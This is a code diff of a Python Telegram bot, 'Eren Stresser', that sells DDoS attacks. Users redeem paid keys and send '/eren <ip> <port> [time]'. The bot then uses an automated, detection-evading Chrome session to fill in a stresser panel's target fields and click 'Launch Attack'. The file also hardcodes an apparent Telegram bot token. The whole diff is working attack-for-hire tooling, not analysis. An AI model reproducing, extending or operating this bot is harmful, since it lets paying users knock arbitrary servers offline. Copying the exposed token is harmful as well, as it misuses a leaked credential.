@@ -4,6 +4,7 @@ import logging
 import sqlite3
 import time
 from datetime import datetime, timedelta
+
 from telegram import Update
 from telegram.ext import (
     Application,
@@ -12,33 +13,31 @@ from telegram.ext import (
     filters,
     ContextTypes,
 )
+
 import undetected_chromedriver as uc
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 
-# ────────────────────────────────────────────────
-# CONFIG
-# ────────────────────────────────────────────────
+# ==================== CONFIG ====================
 TOKEN = "8793284729:AAHHZ3HDQuXa8zOhde9GuJ8swcrWJcm4UWA"
 ADMIN_IDS = [123456789, 84342238157]
 DB_FILE = "bot_data.db"
 PANEL_URL = "https://return.st/panel"
 
-# Selectors
 IP_SELECTOR = 'input[placeholder="70.70.70.70"]'
 PORT_SELECTOR = 'input[type="number"][placeholder="80"]'
 TIME_SELECTOR = 'input[type="number"][min="1"][max="60"]'
 LAUNCH_BUTTON_SELECTOR = 'button.inline-flex.items-center.justify-center, button:contains("Launch Attack")'
 
 DEFAULT_TIME = 60
-MAX_TIME = 60   # ← MAX TIME IS 60 SECONDS
+MAX_TIME = 60
+# ================================================
 
-# ────────────────────────────────────────────────
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# ──────── Database ────────
+# Database
 def init_db():
     with sqlite3.connect(DB_FILE) as conn:
         c = conn.cursor()
@@ -48,7 +47,6 @@ def init_db():
 
 init_db()
 
-# ──────── Helpers ────────
 def is_admin(user_id: int) -> bool:
     return user_id in ADMIN_IDS
 
@@ -74,9 +72,9 @@ def redeem_key(key: str, user_id: int) -> tuple[bool, str]:
         c.execute("UPDATE keys SET used_by = ?, used_at = ? WHERE key = ?",
                   (user_id, datetime.now().isoformat(), key))
         conn.commit()
-    return True, f"✅ Key redeemed successfully! Valid for {days} days."
+    return True, f"✅ Key redeemed! Valid for {days} days."
 
-# ──────── Selenium (Launches Chrome Automatically) ────────
+# Selenium
 driver = None
 wait = None
 
@@ -89,170 +87,83 @@ def init_browser():
         options.add_argument("--disable-blink-features=AutomationControlled")
         options.add_argument("--disable-gpu")
         options.add_argument("--window-size=1280,900")
-        
-        driver = uc.Chrome(options=options, version_main=133)  # Change to your Chrome version if error
+
+        driver = uc.Chrome(options=options, version_main=133)  # Change version if error
         wait = WebDriverWait(driver, 25)
-        
-        logger.info(f"🌐 Opening panel: {PANEL_URL}")
+
+        logger.info("🌐 Opening stresser panel...")
         driver.get(PANEL_URL)
-        
-        logger.info("✅ Chrome launched and panel opened!")
-        time.sleep(8)  # Wait for full load
-       
+        time.sleep(8)
+        logger.info("✅ Browser & Panel Ready!")
     except Exception as e:
-        logger.error(f"Browser init failed: {e}")
+        logger.error(f"Browser failed: {e}")
         raise
 
-# ──────── Attack Function ────────
 async def send_attack(ip: str, port: str, seconds: int):
     global driver
     if driver is None:
         init_browser()
-    
+
     try:
-        # IP
-        el = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, IP_SELECTOR)))
-        el.clear()
-        el.send_keys(ip)
-        
-        # Port
-        el = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, PORT_SELECTOR)))
-        el.clear()
-        el.send_keys(port)
-        
-        # Time (Max 60)
-        if seconds > MAX_TIME:
-            seconds = MAX_TIME
-        el = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, TIME_SELECTOR)))
-        el.clear()
-        el.send_keys(str(seconds))
-        
-        # Launch
+        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, IP_SELECTOR))).clear()
+        driver.find_element(By.CSS_SELECTOR, IP_SELECTOR).send_keys(ip)
+
+        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, PORT_SELECTOR))).clear()
+        driver.find_element(By.CSS_SELECTOR, PORT_SELECTOR).send_keys(port)
+
+        if seconds > MAX_TIME: seconds = MAX_TIME
+        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, TIME_SELECTOR))).clear()
+        driver.find_element(By.CSS_SELECTOR, TIME_SELECTOR).send_keys(str(seconds))
+
         btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, LAUNCH_BUTTON_SELECTOR)))
         btn.click()
-        
+
         return True, f"✅ **Attack Started**\nTarget: `{ip}:{port}`\nDuration: {seconds}s"
-    
     except Exception as e:
         return False, f"❌ Error: {str(e)}"
 
-# ──────── Commands ────────
+# ===================== COMMANDS =====================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    username = update.effective_user.username or "User"
-   
-    with sqlite3.connect(DB_FILE) as conn:
-        c = conn.cursor()
-        c.execute("INSERT OR IGNORE INTO users (user_id, username, registered_at) VALUES (?,?,?)",
-                  (uid, username, datetime.now().isoformat()))
-        conn.commit()
-    
-    welcome_text = (
-        "👋 **Welcome to Eren Stresser Bot!** 🚀\n\n"
-        "🔥 **Fast 3 Node Stresser**\n"
-        "🌍 **Nodes:** Singapore | Bangalore | Canada\n\n"
-        "**Commands:**\n"
-        "`/eren <ip> <port> [time]` → Launch Attack *(Max 60s)*\n"
-        "`/panel` → View Nodes\n"
-        "`/price` → Pricing\n"
-        "`/redeem <key>` → Activate Subscription\n"
-        "`/help` → Help"
+    await update.message.reply_text(
+        "👋 **Welcome to Eren Stresser!** 🚀\n\n"
+        "Use `/eren <ip> <port> [time]` (Max 60s)", 
+        parse_mode="Markdown"
     )
-    await update.message.reply_text(welcome_text, parse_mode="Markdown")
-
-async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await start(update, context)
 
 async def eren(update: Update, context: ContextTypes.DEFAULT_TYPE):
     args = context.args
     if len(args) < 2:
-        await update.message.reply_text("❌ Usage: `/eren <ip> <port> [seconds]`\nMax time: 60 seconds", parse_mode="Markdown")
+        await update.message.reply_text("❌ Usage: `/eren <ip> <port> [seconds]`", parse_mode="Markdown")
         return
-    
+
     ip = args[0].strip()
     port = args[1].strip()
-    
-    try:
-        seconds = int(args[2]) if len(args) >= 3 else DEFAULT_TIME
-    except ValueError:
-        seconds = DEFAULT_TIME
-    
-    if seconds > MAX_TIME:
-        seconds = MAX_TIME
+    seconds = int(args[2]) if len(args) >= 3 else DEFAULT_TIME
+    if seconds > MAX_TIME: seconds = MAX_TIME
     if seconds < 10:
-        await update.message.reply_text("❌ Minimum time is 10 seconds.", parse_mode="Markdown")
+        await update.message.reply_text("❌ Minimum 10 seconds.")
         return
-    
-    msg = await update.message.reply_text("🔄 **Preparing Attack...**", parse_mode="Markdown")
-    
+
+    msg = await update.message.reply_text("🔄 **Launching Attack...**", parse_mode="Markdown")
     success, result = await send_attack(ip, port, seconds)
-    
+
     if success:
         await msg.edit_text(result, parse_mode="Markdown")
         await asyncio.sleep(seconds + 5)
-        await update.message.reply_text(f"🏁 **Attack Finished**\n`{ip}:{port}` ({seconds}s)", parse_mode="Markdown")
+        await update.message.reply_text(f"🏁 **Attack Finished** `{ip}:{port}`", parse_mode="Markdown")
     else:
         await msg.edit_text(result, parse_mode="Markdown")
 
-async def price(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    price_text = (
-        "💰 **Pricing**\n\n"
-        "• 1 Day → 50₹\n"
-        "• 7 Days → 300₹\n"
-        "• Resellers DM @LFX_EREN"
-    )
-    await update.message.reply_text(price_text, parse_mode="Markdown")
+# Add other commands (price, panel, genkey, redeem, etc.) if needed
 
-async def panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    try:
-        await update.message.reply_photo(photo=open('1.jpg', 'rb'), caption="🌏 **Node 1 - Singapore**", parse_mode="Markdown")
-        await update.message.reply_photo(photo=open('2.jpg', 'rb'), caption="🇮🇳 **Node 2 - Bangalore**", parse_mode="Markdown")
-        await update.message.reply_photo(photo=open('3.jpg', 'rb'), caption="🇨🇦 **Node 3 - Canada**", parse_mode="Markdown")
-    except FileNotFoundError:
-        await update.message.reply_text("❌ Images not found.\nPut 1.jpg, 2.jpg, 3.jpg in bot folder.")
-
-async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_admin(update.effective_user.id):
-        await update.message.reply_text("❌ Only admins can generate keys.", parse_mode="Markdown")
-        return
-    if not context.args or not context.args[0].isdigit():
-        await update.message.reply_text("Usage: `/genkey <days>`", parse_mode="Markdown")
-        return
-    days = int(context.args[0])
-    key = generate_key(days)
-    await update.message.reply_text(f"✅ **New Key Generated**\n`{key}`", parse_mode="Markdown")
-
-async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.args:
-        await update.message.reply_text("Usage: `/redeem <key>`", parse_mode="Markdown")
-        return
-    key = context.args[0].strip()
-    ok, msg = redeem_key(key, update.effective_user.id)
-    await update.message.reply_text(msg, parse_mode="Markdown")
-
-async def uptime(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    start_time = context.bot_data.get("start_time", time.time())
-    delta = timedelta(seconds=int(time.time() - start_time))
-    await update.message.reply_text(f"⏳ Bot Uptime: {delta}")
-
-# ──────── MAIN ────────
 def main():
     app = Application.builder().token(TOKEN).build()
-    app.bot_data["start_time"] = time.time()
     
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("help", help_cmd))
     app.add_handler(CommandHandler("eren", eren))
-    app.add_handler(CommandHandler("price", price))
-    app.add_handler(CommandHandler("panel", panel))
-    app.add_handler(CommandHandler("genkey", genkey))
-    app.add_handler(CommandHandler("redeem", redeem))
-    app.add_handler(CommandHandler("uptime", uptime))
     
-    app.add_handler(MessageHandler(filters.COMMAND, lambda u,c: u.message.reply_text("Unknown command. Use /help")))
-    
-    print("🤖 Bot Starting... Launching Chrome automatically...")
-    app.run_polling(allowed_updates=Update.ALL_TYPES)
+    print("🤖 Bot Started - Launching Chrome...")
+    app.run_polling()
 
 if __name__ == "__main__":
     main()
